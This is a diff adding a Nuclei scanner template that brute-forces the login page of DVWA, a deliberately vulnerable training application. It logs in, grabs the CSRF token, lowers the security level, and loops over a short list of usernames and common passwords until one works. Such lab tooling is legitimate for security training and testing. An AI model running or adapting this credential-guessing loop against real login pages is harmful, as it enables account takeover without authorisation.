@@ -1,0 +1,135 @@
+id: dvwa-brute-force-low-sec-post
+
+info:
+  name: DVWA Brute Force - low sec POST (Authenticated)
+  author: Dylan Shield (Shieldia.co)
+  severity: high
+  description: Attempts to brute force the DVWA after authentication using the POST method.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,brute-force
+
+variables:
+  password: "password"
+  username: "admin"
+  dvwa_usernames:
+    - "admin"
+    - "1337"
+    - "gordonb"
+    - "pablo"
+    - "smithy"
+  dvwa_passwords:
+    - "eminem"
+    - "matthew"
+    - "robert"
+    - "danielle"
+    - "forever"
+    - "family"
+    - "jonathan"
+    - "98765432"
+    - "computer"
+    - "whatever"
+    - "dragon"
+    - "vanessa"
+    - "cookie"
+    - "naruto"
+    - "summer"
+    - "sweety"
+    - "spongebob"
+    - "joseph"
+    - "junior"
+    - "softball"
+    - "taylor"
+    - "yellow"
+    - "daniela"
+    - "lauren"
+    - "mickey"
+    - "princesa"
+    - "buster"
+    - "george"
+    - "brittany"
+    - "alejandra"
+    - "patricia"
+    - "rachel"
+    - "tequiero"
+    - "7777777"
+    - "cheese"
+    - "159753"
+    - "password"
+    - "charley"
+    - "abc123"
+    - "letmein"
+
+flow: |
+  http(1) && http(2);
+  for (let user of iterate(template["dvwa_usernames"])) {
+    set("user", user);
+    for (let pass of iterate(template["dvwa_passwords"])) {
+      set("pass", pass);
+      http(3);
+    }
+  }
+
+http:
+  # Step 1: Authenticate and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+  # Step 3: Execute Brute Force (Iterates Over Usernames and Passwords)
+  - raw:
+      - |
+        POST /DVWA/vulnerabilities/brute/?Login=Login&username={{user}}&password={{pass}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Welcome to the password protected area"
+
+    extractors:
+      - type: dsl
+        name: user pass
+        dsl:
+          - "concat('Username: ',user,' Password: ', pass)"
+    
